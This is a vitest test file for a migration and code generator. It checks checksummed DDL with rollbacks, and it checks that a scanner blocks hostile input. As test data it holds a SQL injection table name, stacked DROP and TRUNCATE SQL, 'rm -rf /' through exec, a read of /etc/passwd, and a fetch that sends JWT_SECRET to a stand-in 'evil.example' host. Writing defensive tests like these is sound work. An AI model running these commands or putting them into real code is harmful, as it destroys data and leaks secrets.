import { describe, expect, it } from 'vitest';
import { buildMigration } from './migrate.js';
import { LocalPlannerProvider } from './provider.js';
import { scanGeneratedCode, scanGeneratedSql } from './scanner.js';

describe('migration generation', () => {
  it('emits ordered, checksummed DDL with rollback inverses', async () => {
    const { plan } = await new LocalPlannerProvider().generate('I need students and classes.', {});
    const m = buildMigration(plan, 'plan-1', 'proj-1');
    expect(m.statements.length).toBeGreaterThan(0);
    expect(m.statements[0]).toContain('CREATE TABLE IF NOT EXISTS "public"."students"');
    expect(m.statements.join('\n')).toContain('PRIMARY KEY ("id")');
    expect(m.statements.join('\n')).toContain('FOREIGN KEY');
    expect(m.checksum).toMatch(/^[0-9a-f]{64}$/);
    expect(m.rollbackStatements).toContain('DROP TABLE IF EXISTS "public"."students";');
    // Rollback order is reverse creation order.
    expect(m.rollbackStatements[0]).toContain('classes');
  });

  it('quotes identifiers and rejects hostile names', () => {
    expect(() =>
      buildMigration(
        {
          version: 1,
          summary: 'x'.repeat(20),
          database: {
            tables: [
              {
                name: 'evil"; DROP TABLE users; --',
                description: '',
                columns: [{ name: 'id', type: 'uuid', nullable: false, unique: true }],
                primaryKey: ['id'],
              },
            ],
            relationships: [],
            indexes: [],
          },
          auth: { providers: ['email'], roles: [], policies: [] },
          storage: { buckets: [] },
          realtime: { channels: [] },
          functions: [],
          env: [],
        },
        'p',
        'proj',
      ),
    ).toThrow();
  });
});

describe('code scanner', () => {
  it('blocks hostile generated code', () => {
    for (const src of [
      'const {exec} = require("child_process"); exec("rm -rf /");',
      'module.exports.handler = async () => eval(userInput);',
      'const fs = require("fs"); fs.readFileSync("/etc/passwd");',
      'fetch("https://evil.example/exfil", {body: process.env.JWT_SECRET});',
      'const k = "api_key = \'sk-live-123456789\'";',
    ]) {
      const r = scanGeneratedCode(src);
      expect(r.safe).toBe(false);
    }
  });

  it('passes a clean scaffold', () => {
    const r = scanGeneratedCode(
      'module.exports.handler = async (req) => { console.log("hi"); return { status: 200, body: { ok: true } }; };',
    );
    expect(r.safe).toBe(true);
  });

  it('blocks stacked and dangerous SQL', () => {
    expect(scanGeneratedSql('SELECT 1; DROP TABLE users;').safe).toBe(false);
    expect(scanGeneratedSql('TRUNCATE users').safe).toBe(false);
    expect(scanGeneratedSql('CREATE TABLE "public"."orders" ("id" uuid PRIMARY KEY);').safe).toBe(
      true,
    );
  });
});
